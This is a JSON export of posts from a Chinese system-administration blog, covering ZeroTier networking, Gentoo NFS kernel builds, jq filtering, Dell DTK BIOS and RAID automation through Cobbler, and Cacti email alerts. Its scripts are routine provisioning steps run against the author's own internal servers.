id的全球虚拟网络, 接下来需要在 https:&#x2F;&#x2F;my.zerotier.com&#x2F;network&#x2F; 页面（页面下方）Members板块，勾选已经加入的3台设备信息，勾选后，设备状态变更为ONLINE 测试1234(1)一切已准备就绪, 这个时候可以去linux服务器中通过ifconfig命令获取ZeroTier的私有网络IP地址(2)在电脑或手机上，将连接linux服务器的IP地址改为这个私有网络的IP地址进行连接登陆即可 注：如果有密钥或修改了ssh端口的话,也需要与原登陆信息保持一致 其他用途1自己想吧...","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zerotier","slug":"zerotier","permalink":"https://garywu520.github.io/tags/zerotier/"},{"name":"内网穿透","slug":"内网穿透","permalink":"https://garywu520.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"全球畅联","slug":"全球畅联","permalink":"https://garywu520.github.io/tags/%E5%85%A8%E7%90%83%E7%95%85%E8%81%94/"}]},{"title":"Gentoo编译内核-NFS","slug":"Gentoo编译内核-NFS","date":"2017-05-14T08:35:11.000Z","updated":"2018-05-14T10:14:33.863Z","comments":true,"path":"2017/05/14/Gentoo编译内核-NFS/","link":"","permalink":"https://garywu520.github.io/2017/05/14/Gentoo%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8-NFS/","excerpt":"1Gentoo版本较老，部署NFS过程中启动NFS服务报错，提示缺少内核模块，接下来编译内核","text":"1Gentoo版本较老，部署NFS过程中启动NFS服务报错，提示缺少内核模块，接下来编译内核 错误12345678错误：# &#x2F;etc&#x2F;init.d&#x2F;nfs start * Exporting NFS directories ... [ ok ] * Starting NFS mountd ... [ !! ] * Starting NFS daemon ... rpc.nfsd: Unable to access &#x2F;proc&#x2F;fs&#x2F;nfsd errno 2 (No such file or directory). Please try, as root, &#39;mount -t nfsd nfsd &#x2F;proc&#x2F;fs&#x2F;nfsd&#39; and then restart rpc.nfsd to correct the problem [ !! ] * Starting NFS smnotify ... 添加kernel选项,以支持NFS官网：https://wiki.gentoo.org/wiki/Nfs-utils 12# cd &#x2F;usr&#x2F;src&#x2F;linux# make menuconfig 1234567891011File systems ---&gt; [*] Dnotify support [*] Network File Systems ---&gt; &lt;*&gt; NFS client support &lt;*&gt; NFS client support for NFS version 3 &lt;*&gt; NFS client support for NFS version 4 [*] NFS client support for NFSv4.1 &lt;*&gt; NFS server support [*] NFS server support for NFS version 3 [*] NFS server support for NFS version 4 [*] NFSv4.1 server support for Parallel NFS (pNFS) 1保存配置：把配置写入保存到一个文件中。CONFIG文件存放目录: &#x2F;usr&#x2F;src&#x2F;linux 123456789# grep -i &quot;nfsd&quot; &#x2F;usr&#x2F;src&#x2F;linux&#x2F;.config CONFIG_NFSD&#x3D;yCONFIG_NFSD_V2_ACL&#x3D;yCONFIG_NFSD_V3&#x3D;yCONFIG_NFSD_V3_ACL&#x3D;yCONFIG_NFSD_V4&#x3D;yCONFIG_NFSD_PNFS&#x3D;y确认NFS所需模块已存在就进行下一步 编译和替换kernel123456# cd &#x2F;usr&#x2F;src&#x2F;linux编译# make &amp;&amp; make modules_install# make install注意看输出信息：Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready(#4) 12345678910111213mount &#x2F;boot&#x2F; 或 mount &#x2F;dev&#x2F;sda1 &#x2F;boot&#x2F;查看确认新内核文件ls -lh &#x2F;usr&#x2F;src&#x2F;linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImage确认引用的配置文件名称,假如是kernel-0808cat &#x2F;boot&#x2F;grub&#x2F;grub.conf备份内核cp &#x2F;boot&#x2F;kernel-0808 &#x2F;boot&#x2F;kernel-0808.bak替换内核cp &#x2F;usr&#x2F;src&#x2F;linux&#x2F;arch&#x2F;x86&#x2F;boot&#x2F;bzImage &#x2F;boot&#x2F;kernel-0808 1确认无误后reboot重启 部署NFS-服务端安装NFS Server and Client1emerge --ask net-fs&#x2F;nfs-utils 编辑配置文件123cat &#x2F;etc&#x2F;exports&#x2F;data&#x2F;B&#x2F;data 192.168.0.*(rw,sync,all_squash,anonuid&#x3D;8080,anongid&#x3D;8080,no_subtree_check) 1234注：id为8080的用户需存在,否则客户端会报权限拒绝。mkdir -p &#x2F;data&#x2F;B&#x2F;datachown -R mx-www:mx-www &#x2F;data&#x2F;B&#x2F;data 启动12345&#x2F;etc&#x2F;init.d&#x2F;rpcbind startrc-update add rpcbind default&#x2F;etc&#x2F;init.d&#x2F;nfs startrc-update add rpcbind default 服务检查1rpcinfo -p NFS客户端安装NFS1emerge --ask net-fs&#x2F;nfs-utils 客户端挂载1mount -t nfs 192.168.0.200:&#x2F;data&#x2F;B&#x2F;data &#x2F;data&#x2F;NFS 注意事项1由于NFS的特性，当NFS服务器宕机后，客户端容易变成夯住状态，所以客户端禁止配置开机自动挂载。 NFS共享参数123456789101112131415161718ro 只读访问 rw 读写访问 sync 所有数据在请求时写入共享 async NFS在写入数据前可以相应请求 secure NFS通过1024以下的安全TCP&#x2F;IP端口发送 insecure NFS通过1024以上的端口发送 wdelay 如果多个用户要写入NFS目录，则归组写入（默认） no_wdelay 如果多个用户要写入NFS目录，则立即写入，当使用async时，无需此设置 hide 在NFS共享目录中不共享其子目录 no_hide 共享NFS目录的子目录 subtree_check 如果共享&#x2F;usr&#x2F;bin之类的子目录时，强制NFS检查父目录的权限（默认） no_subtree_check 和上面相对，不检查父目录权限 all_squash 共享文件的UID和GID映射匿名用户anonymous，适合公用目录 no_all_squash 保留共享文件的UID和GID（默认） root_squash root 用户的所有请求映射成如anonymous用户一样的权限（默认） no_root_squash root用户具有根目录的完全管理访问权限 anonuid&#x3D;xxx 指定NFS服务器&#x2F;etc&#x2F;passwd文件中匿名用户的UID anongid&#x3D;xxx 指定NFS服务器&#x2F;etc&#x2F;passwd文件中匿名用户的GID","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Gentoo","slug":"Gentoo","permalink":"https://garywu520.github.io/tags/Gentoo/"},{"name":"编译内核","slug":"编译内核","permalink":"https://garywu520.github.io/tags/%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8/"},{"name":"NFS","slug":"NFS","permalink":"https://garywu520.github.io/tags/NFS/"}]},{"title":"使用jq命令行处理json数据","slug":"使用jq命令行处理json数据","date":"2017-04-27T07:37:53.000Z","updated":"2018-04-27T07:51:57.126Z","comments":true,"path":"2017/04/27/使用jq命令行处理json数据/","link":"","permalink":"https://garywu520.github.io/2017/04/27/%E4%BD%BF%E7%94%A8jq%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%84%E7%90%86json%E6%95%B0%E6%8D%AE/","excerpt":"1jq 是一款命令行下处理 JSON 数据的工具。其可以接受标准输入，命令管道或者文件中的 JSON 数据，经过一系列的过滤器(filters)和表达式的转后形成我们需要的数据结构并将结果输出到标准输出中。jq 的这种特性使我们可以很容易地在 Shell 脚本中调用它。","text":"1jq 是一款命令行下处理 JSON 数据的工具。其可以接受标准输入，命令管道或者文件中的 JSON 数据，经过一系列的过滤器(filters)和表达式的转后形成我们需要的数据结构并将结果输出到标准输出中。jq 的这种特性使我们可以很容易地在 Shell 脚本中调用它。 jq编译安装123456git clone https:&#x2F;&#x2F;github.com&#x2F;stedolan&#x2F;jq.gitcd jqautoreconf -i.&#x2F;configure --disable-maintainer-modemakesudo make install 查看帮助123456789jq -h 查看帮助-c选项：加速-c参数，表示将标准json格式转为普通文本模式；不使用-c参数时，则输出为标准json格式。-r选项: 该选项控制 jq 是输出 raw 格式内容或 JSON 格式内容。所谓的 JSON 格式是指符合 JSON 标准的格式。例如，假设我们要查询 JSON 字符串&#123;&quot;name&quot;:&quot;tom&quot;&#125;中 name 的值. 使用-r 选项时返回的是&#39;tom&#39;. 不使用-r 选项时，返回的是&#39;&quot;tom&quot;&#39;.返回值多了一对双引号。-s 选项: jq 可以同时处理空格分割的多个 JSON 字符串输入。默认情况下，jq 会将 filter 分别对每个 JSON 输入应用，并返回结果。使用-s 选项，jq 会将所有的 JSON 输入放入一个数组中并在这个数组上使用 filter。&quot;-s&quot;选项不但影响到 filter 的写法。如果在 filter 中需要对数据进行选择和映射，其还会影响最终结果。--arg选项: jq 通过该选项提供了和宿主脚本语言交互的能力。该选项将值(v)绑定到一个变量(a)上。在后面的 filter 中可以直接通过变量引用这个值。例如，filter &#39;.$a&#39;表示查询属性名称等于变量 a 的值的属性。 筛选大于某个值的数据到文件123cat test.json |jq -c --arg time $unix_time -r &#39;select(.ctime &gt; ($time | tonumber))&#39; &gt;test2.json把$unix_time的值赋给变量time, 并将文本中的ctime字段与$time进行比对，如果ctime的值大于$time的值,则筛选出来的json数据行就输出到test2.json文件中。 更多：IBM","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"json","slug":"json","permalink":"https://garywu520.github.io/tags/json/"},{"name":"jq","slug":"jq","permalink":"https://garywu520.github.io/tags/jq/"},{"name":"筛选大于某个值的数据到文件","slug":"筛选大于某个值的数据到文件","permalink":"https://garywu520.github.io/tags/%E7%AD%9B%E9%80%89%E5%A4%A7%E4%BA%8E%E6%9F%90%E4%B8%AA%E5%80%BC%E7%9A%84%E6%95%B0%E6%8D%AE%E5%88%B0%E6%96%87%E4%BB%B6/"}]},{"title":"cobbler使用DTK自动化升级BIOS","slug":"cobbler使用DTK自动化升级BIOS","date":"2017-04-17T14:19:13.000Z","updated":"2018-04-20T06:33:12.225Z","comments":true,"path":"2017/04/17/cobbler使用DTK自动化升级BIOS/","link":"","permalink":"https://garywu520.github.io/2017/04/17/cobbler%E4%BD%BF%E7%94%A8DTK%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8D%87%E7%BA%A7BIOS/","excerpt":"1cobbler使用DTK自动化升级BIOS","text":"1cobbler使用DTK自动化升级BIOS 下载DTK ISO镜像 1地址：https:&#x2F;&#x2F;www.dell.com&#x2F;support&#x2F;home&#x2F;cn&#x2F;zh&#x2F;cndhs1&#x2F;Drivers&#x2F;DriversDetails?driverId&#x3D;GYHHX 挂载iso并安装rpm基础包1234567891011121314mount -o loop dtk_5.3.0_1908_Linux64_A00.iso &#x2F;mntcd &#x2F;mnt&#x2F;RPMs&#x2F;rhel7&#x2F;x86_64ls #注:以下包安装有前后顺序yum install -y srvadmin*yum install -y raidcfg-5.3.0-1908.9058.el7.x86_64.rpmyum install -y syscfg-5.3.0-1908.9058.el7.x86_64.rpmyum install -y dtk-scripts-5.3.0-1908.9058.el7.x86_64.rpm命令软链ln -sv &#x2F;opt&#x2F;dell&#x2F;toolkit&#x2F;bin&#x2F;raidcfg &#x2F;usr&#x2F;sbin&#x2F;raidcfg注：我的cobbler部署在了CentOS7上，所以需要进入rhel7目录。 了解文件SA.1和SA.212345678910# ls -lh &#x2F;mnt&#x2F;isolinux&#x2F;......-r--r--r-- 1 root root 4.0M Feb 15 2016 SA.1-r--r--r-- 1 root root 158M Feb 15 2016 SA.2......# file &#x2F;mnt&#x2F;isolinux&#x2F;SA.1 # file &#x2F;mnt&#x2F;isolinux&#x2F;SA.2上面可以看到有两个文件SA.1和SA.2, 这两个文件分别是kernel和initrd文件,稍后导入到cobbler的时候会用到它们。 手动添加dtk所需文件到cobbler启动菜单1234567891011121314151617181920212223242526272829mkdir -p &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R610mkdir -p &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R620mkdir -p &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R710mkdir -p &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R720cp &#x2F;mnt&#x2F;isolinux&#x2F;SA* &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R610cp &#x2F;mnt&#x2F;isolinux&#x2F;SA* &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R620cp &#x2F;mnt&#x2F;isolinux&#x2F;SA* &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R710cp &#x2F;mnt&#x2F;isolinux&#x2F;SA* &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R720将dtk导入到cobbler#R610cobbler distro add --name&#x3D;R610_bios_upgrade --kernel&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R610&#x2F;SA.1 --initrd&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R610&#x2F;SA.2cobbler profile add --name&#x3D;R610_bios_upgrade --distro&#x3D;R610_bios_upgrade#R620cobbler distro add --name&#x3D;R620_bios_upgrade --kernel&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R620&#x2F;SA.1 --initrd&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R620&#x2F;SA.2cobbler profile add --name&#x3D;R620_bios_upgrade --distro&#x3D;R620_bios_upgrade#R710cobbler distro add --name&#x3D;R710_bios_upgrade --kernel&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R710&#x2F;SA.1 --initrd&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R710&#x2F;SA.2cobbler profile add --name&#x3D;R710_bios_upgrade --distro&#x3D;R710_bios_upgrade#R720cobbler distro add --name&#x3D;R720_bios_upgrade --kernel&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R720&#x2F;SA.1 --initrd&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;BIOS&#x2F;R720&#x2F;SA.2cobbler profile add --name&#x3D;R720_bios_upgrade --distro&#x3D;R720_bios_upgrade#查看cobbler profile list cobbler distro list 配置BIOS自动化升级脚本并与distro进行关联123456mkdir -p &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;bios&#x2F;R610mkdir -p &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;bios&#x2F;R620mkdir -p &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;bios&#x2F;R710mkdir -p &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;bios&#x2F;R720Dell官网分别下载对应服务器型号的*.BIN格式的BIOS升级文件到以上对应目录中 123456789101112131415161718192021222324#R610[root@cobbler-9 bios]# cat R610&#x2F;R610_bios_upgrade.sh #!&#x2F;bin&#x2F;bashcat &gt;&gt;&#x2F;tmp&#x2F;r610_bios.sh &lt;&lt;EOFtftp -g -r bios&#x2F;R610&#x2F;R610_BIOS_C6MRW_LN_6.4.0.BIN -l r610_bios.sh 192.168.1.1sh r610_bios.sh -q sleep 10rebootEOFsh &#x2F;tmp&#x2F;r610_bios.sh参数-解释：-g 表示下载文件-r 表示远程文件名-l 表示本地文件名-p 表示上传文件IP&#x3D;tftp_server_ip注：(1)如果不加上 -q(untended) 参数，则表示以交互式的方式进行，这明显不符合自动化需求。 (2)若升级的固件版本与现有版本一致则跳过升级 12345678910111213#R620[root@cobbler-9 bios]# cat R620&#x2F;R620_bios_upgrade.sh #!&#x2F;bin&#x2F;bashcat &gt;&gt;&#x2F;tmp&#x2F;r620_bios.sh &lt;&lt;EOFtftp -g -r bios&#x2F;R620&#x2F;R620_BIOS_KR1XT_LN_2.5.4.BIN -l r620_bios.sh 192.168.1.1sh r620_bios.sh -q sleep 10rebootEOFsh &#x2F;tmp&#x2F;r620_bios.sh 12345678910111213#R710[root@cobbler-9 bios]# cat R710&#x2F;R710_bios_upgrade.sh #!&#x2F;bin&#x2F;bashcat &gt;&gt;&#x2F;tmp&#x2F;r710_bios.sh &lt;&lt;EOFtftp -g -r bios&#x2F;R710&#x2F;R710_BIOS_4HKX2_LN_6.4.0.BIN -l r710_bios.sh 192.168.1.1sh r710_bios.sh -q sleep 10rebootEOFsh &#x2F;tmp&#x2F;r710_bios.sh 12345678910111213#R720[root@cobbler-9 bios]# cat R720&#x2F;R720_bios_upgrade.sh #!&#x2F;bin&#x2F;bashcat &gt;&gt;&#x2F;tmp&#x2F;r720_bios.sh &lt;&lt;EOFtftp -g -r bios&#x2F;R720&#x2F;R720_BIOS_NPPKY_LN32_1.3.6.BIN -l r720_bios.sh 192.168.1.1sh r720_bios.sh -q sleep 10rebootEOFsh &#x2F;tmp&#x2F;r720_bios.sh 12345修改权限chmod 755 R610&#x2F;R610_bios_upgrade.sh chmod 755 R620&#x2F;R620_bios_upgrade.sh chmod 755 R710&#x2F;R710_bios_upgrade.sh chmod 755 R720&#x2F;R720_bios_upgrade.sh 1234567891011#R610cobbler distro edit --name&#x3D;R610_bios_upgrade --kopts&#x3D;&quot;share_type&#x3D;tftp share_location&#x3D;&#x2F;bios&#x2F;R610 share_script&#x3D;R610_bios_upgrade.sh tftp_ip&#x3D;192.168.1.1&quot;#R620cobbler distro edit --name&#x3D;R620_bios_upgrade --kopts&#x3D;&quot;share_type&#x3D;tftp share_location&#x3D;&#x2F;bios&#x2F;R620 share_script&#x3D;R620_bios_upgrade.sh tftp_ip&#x3D;192.168.1.1&quot;#R710cobbler distro edit --name&#x3D;R710_bios_upgrade --kopts&#x3D;&quot;share_type&#x3D;tftp share_location&#x3D;&#x2F;bios&#x2F;R710 share_script&#x3D;R710_bios_upgrade.sh tftp_ip&#x3D;192.168.1.1&quot;#R720cobbler distro edit --name&#x3D;R720_bios_upgrade --kopts&#x3D;&quot;share_type&#x3D;tftp share_location&#x3D;&#x2F;bios&#x2F;R720 share_script&#x3D;R720_bios_upgrade.sh tftp_ip&#x3D;192.168.1.1&quot; 保存配置并重启相关服务 1cobbler sync 注意事项： 1注：脚本中，如果不加上 -q(untended) 参数，则表示以交互式的方式进行，这明显不符合自动化需求。 关于BIOS降级： 12345678910111213如果需要降级，在脚本中sh后面需要加上 -f(force) 参数，同时要配合 -q 使用。降级脚本示例如下：[root@cobbler-9 bios]# cat R720&#x2F;R720_bios_slow.sh #!&#x2F;bin&#x2F;bashcat &gt;&gt;&#x2F;tmp&#x2F;r720_bios.sh &lt;&lt;EOFtftp -g -r bios&#x2F;R720&#x2F;R720_BIOS_NPPKY_LN32_1.3.6.BIN -l r720_bios.sh 192.168.1.1sh -f r720_bios.sh -q sleep 10rebootEOFsh &#x2F;tmp&#x2F;r720_bios.sh Done.","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"自动化","slug":"自动化","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"cobbler","slug":"cobbler","permalink":"https://garywu520.github.io/tags/cobbler/"},{"name":"DTK","slug":"DTK","permalink":"https://garywu520.github.io/tags/DTK/"},{"name":"BIOS","slug":"BIOS","permalink":"https://garywu520.github.io/tags/BIOS/"}]},{"title":"cacti配置邮件短信告警","slug":"cacti配置邮件告警","date":"2017-04-13T07:50:38.000Z","updated":"2018-04-13T08:32:22.271Z","comments":true,"path":"2017/04/13/cacti配置邮件告警/","link":"","permalink":"https://garywu520.github.io/2017/04/13/cacti%E9%85%8D%E7%BD%AE%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6/","excerpt":"1cacti邮件告警","text":"1cacti邮件告警 cacti插件安装1234567891011121314151617181920所需插件：Setting插件 用于邮件报警Thold插件 用于设备异常预警、阀值报警monitor插件 主机状态监控下载插件：http:&#x2F;&#x2F;docs.cacti.net&#x2F;plugin:tholdhttp:&#x2F;&#x2F;docs.cacti.net&#x2F;plugin:settingshttp:&#x2F;&#x2F;docs.cacti.net&#x2F;plugin:monitor安装插件：tar zxvf thold-v0.5.0.tgz -C &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;cacti&#x2F;pluginstar zxvf settings-v0.71-1.tgz -C &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;cacti&#x2F;plugins&#x2F;tar zxvf monitor-v1.3-1.tgz -C &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;cacti&#x2F;plugins&#x2F;注册到Cacti页签[root@localhost ~]# vi &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;cacti&#x2F;include&#x2F;config.php$url_path &#x3D; &quot;&#x2F;&quot;; #在这行下面添加如下两行$plugins[] &#x3D; &#39;settings&#39;;$plugins[] &#x3D; &#39;thold&#39;; 启动插件123登陆Web -- console -- Plugin Management -- 点击向下箭头↓ 来安装插件3个插件 --- 启动插件之后，Web控制栏会多出一些功能选项 配置发送邮件信息1234567891011console -- Settings -- Mail&#x2F;DNS Test Email：用于发送到这个邮箱做测试Mail Services: SMTPFrom Email Address: 填写发送邮箱地址 From Name: 填写发送邮箱地址SMTP Hostname: exmail.qq.comSMTP Port: 25SMTP Username: 填写发送邮箱地址SMTP Password: 填写邮箱密码DNS：114.114.114.114 将Bitys转换为Mbits,便于设置阈值123默认Cacti报警使用Bites来监控流量的，需要转换成Mbits，这样方便设置阀值。console -- GraphManagement -- CDEFs -- 填写：Add—Byte to Mbits 添加成如下所示 #####告警展示在Monitor界面 1console -- settings -- Misc -- 勾选：Show Icon Legend 添加监控对象与报警信息123456console -- Thresholds -- addHost: 选择对应的HOSTGraph: 选择要监控的接口Data Source: 选择traffic_in或traffic_out点击Create创建 1234567891011121314151617接下来分别设置traffic_in和traffic_out, 配置如下：勾选：Threshold EnabledRe-Alert Cycle: Every 30 Minutes 若故障持续存在,30分钟后，重复发送告警。Warning High &#x2F; Low Settings：根据实际情况修改, 这个是高于某个值发警告Alert High &#x2F; Low Settings： 这个严重等级更高 High Threshold： 450 Low Threshold：0 Breach Duration：5 Minutes套用刚才自定义的带宽模板Data Type： CDEFThreshold CDEF: Byte to MbitsAlert Emails: 填写收件人邮箱Warning Emails: 填写收件人邮箱 查看报警状态及测试报警1Web控制栏 -- thold","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cacti","slug":"cacti","permalink":"https://garywu520.github.io/tags/cacti/"},{"name":"邮件告警","slug":"邮件告警","permalink":"https://garywu520.github.io/tags/%E9%82%AE%E4%BB%B6%E5%91%8A%E8%AD%A6/"},{"name":"短信告警","slug":"短信告警","permalink":"https://garywu520.github.io/tags/%E7%9F%AD%E4%BF%A1%E5%91%8A%E8%AD%A6/"},{"name":"将Bites转换为Mbits","slug":"将Bites转换为Mbits","permalink":"https://garywu520.github.io/tags/%E5%B0%86Bites%E8%BD%AC%E6%8D%A2%E4%B8%BAMbits/"}]},{"title":"cobbler使用DTK自动化做RAID","slug":"cobbler使用DTK自动化做RAID","date":"2017-04-12T06:27:50.000Z","updated":"2018-04-17T12:53:12.357Z","comments":true,"path":"2017/04/12/cobbler使用DTK自动化做RAID/","link":"","permalink":"https://garywu520.github.io/2017/04/12/cobbler%E4%BD%BF%E7%94%A8DTK%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9ARAID/","excerpt":"1Dell提供一个叫做DTK(dell openmanage deployment toolkit)的套件, 套件包含了 raidcfg 这个工具。dtk导入cobbler之后，就可以自动化的完成RAID卡的设置；以及自动化完成修改BIOS设置.","text":"1Dell提供一个叫做DTK(dell openmanage deployment toolkit)的套件, 套件包含了 raidcfg 这个工具。dtk导入cobbler之后，就可以自动化的完成RAID卡的设置；以及自动化完成修改BIOS设置. 自动化配置RAID下载DTK ISO镜像 下载: DTK_v5.3(最新版) 挂载iso并安装rpm基础包1234567891011121314mount -o loop dtk_5.3.0_1908_Linux64_A00.iso &#x2F;mntcd &#x2F;mnt&#x2F;RPMs&#x2F;rhel7&#x2F;x86_64ls #注:以下包安装有前后顺序yum install -y srvadmin*yum install -y raidcfg-5.3.0-1908.9058.el7.x86_64.rpmyum install -y syscfg-5.3.0-1908.9058.el7.x86_64.rpmyum install -y dtk-scripts-5.3.0-1908.9058.el7.x86_64.rpm命令软链ln -sv &#x2F;opt&#x2F;dell&#x2F;toolkit&#x2F;bin&#x2F;raidcfg &#x2F;usr&#x2F;sbin&#x2F;raidcfg注：我的cobbler部署在了CentOS7上，所以需要进入rhel7目录。 了解文件SA.1和SA.212345678910# ls -lh &#x2F;mnt&#x2F;isolinux&#x2F;......-r--r--r-- 1 root root 4.0M Feb 15 2016 SA.1-r--r--r-- 1 root root 158M Feb 15 2016 SA.2......# file &#x2F;mnt&#x2F;isolinux&#x2F;SA.1 # file &#x2F;mnt&#x2F;isolinux&#x2F;SA.2上面可以看到有两个文件SA.1和SA.2, 这两个文件分别是kernel和initrd文件,稍后导入到cobbler的时候会用到它们。 手动添加dtk所需文件到cobbler启动菜单123456789101112拷贝SA.1和SA.2到&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;目录中# mkdir &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;dtk5.3_raid5_n3x1&#x2F;# cp &#x2F;mnt&#x2F;isolinux&#x2F;SA* &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;dtk5.3_raid5_n3x1将dtk导入到cobbler# cobbler distro add --name&#x3D;dtk5.3_raid5_n3x1 --kernel&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;dtk5.3_raid5_n3x1&#x2F;SA.1 --initrd&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;dtk5.3_raid5_n3x1&#x2F;SA.2# cobbler profile add --name&#x3D;dtk5.3_raid5_n3x1 --distro&#x3D;dtk5.3_raid5_n3x1注: name名称定义为&quot;dtk5.3_raid5_n3x1&quot;原因是便于识别,即3块盘做1组RAID5。查看确认# cobbler profile list # cobbler distro list 配置RAID自动化脚本并与distro进行关联1234567891011121314151617181920212223242526272829303132333435创建raid脚本文件存放目录mkdir &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;raidcfg&#x2F;raid5_n3x1 接下来配置raid5.sh脚本vim &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;raidcfg&#x2F;raid5_n3x1&#x2F;raid5_n3x1.sh 内容如下：##-----------脚本内容开始-------------------------#!&#x2F;bin&#x2F;bashcat &gt;&gt; &#x2F;tmp&#x2F;raid5.ini &lt;&lt;EOF[vdisk0]controllerid&#x3D;0raid&#x3D;5readpolicy&#x3D;nrawritepolicy&#x3D;wtstripesize&#x3D;64cachepolicy&#x3D;eadisk&#x3D;0:0:1,0:1:1,0:2:1EOFecho &quot;…………. reset all disks ………….&quot; raidcfg -ctrl -c&#x3D;0 -ac&#x3D;rstecho &quot;………. 3 disks for raid5 ……….&quot;raidcfg -i&#x3D;&#x2F;tmp&#x2F;raid5.iniecho &quot;…………… fast init ……………&quot;raidcfg -vd -c&#x3D;0 -vd&#x3D;0 -ac&#x3D;fi echo &quot;…………… RAID5 is created, this is server will be shutdown... ……………&quot;shutdown##-------------脚本内容结束-----------------------脚本含义：首先使用raidcfg命令reset控制器，删除所有原有RAID配置，将磁盘置为&quot;JBOD&quot;模式。然后再次调用raidcfg，创建RAID5。创建好RAID之后，让系统重启(如果写shutdown则关机)chmod 755 &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;raidcfg&#x2F;raid5_n3x1&#x2F;raid5_n3x1.sh注：cobbler服务器千万不要运行这个脚本,你懂得 1234把raid5脚本与distro进行关联cobbler distro edit --name&#x3D;dtk5.3_raid5_n3x1 --kopts&#x3D;&quot;share_type&#x3D;tftp share_location&#x3D;&#x2F;raidcfg&#x2F;dtk5.3_raid5_n3x1 share_script&#x3D;dtk5.3_raid5_n3x1.sh tftp_ip&#x3D;x.x.x.x&quot;注: 这条命令修改的配置文件是&#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;pxelinux.cfg&#x2F;default 最后执行cobbler sync命令12最后执行命令: cobbler sync目的：保存配置 导入多个dtk满足不同raid自动化需求12345678910111213141516171819202122232425例如：Dell R720,8块盘满配，4块一组RAID5，做两组。mount -o loop dtk_5.3.0_1908_Linux64_A00.iso &#x2F;mntcd &#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;mkdir dtk5.3_raid5_n4x2cp &#x2F;mnt&#x2F;isolinux&#x2F;SA* dtk5.3_raid5_n4x2&#x2F;cd dtk5.3_raid5_n4x2&#x2F; &amp;&amp; lscobbler distro add --name&#x3D;dtk5.3_raid5_n4x2 --kernel&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;dtk5.3_raid5_n4x2&#x2F;SA.1 --initrd&#x3D;&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror&#x2F;dtk5.3_raid5_n4x2&#x2F;SA.2cobbler profile add --name&#x3D;dtk5.3_raid5_n4x2 --distro&#x3D;dtk5.3_raid5_n4x2cobbler profile listcobbler distro listcd &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;raidcfg&#x2F;mkdir 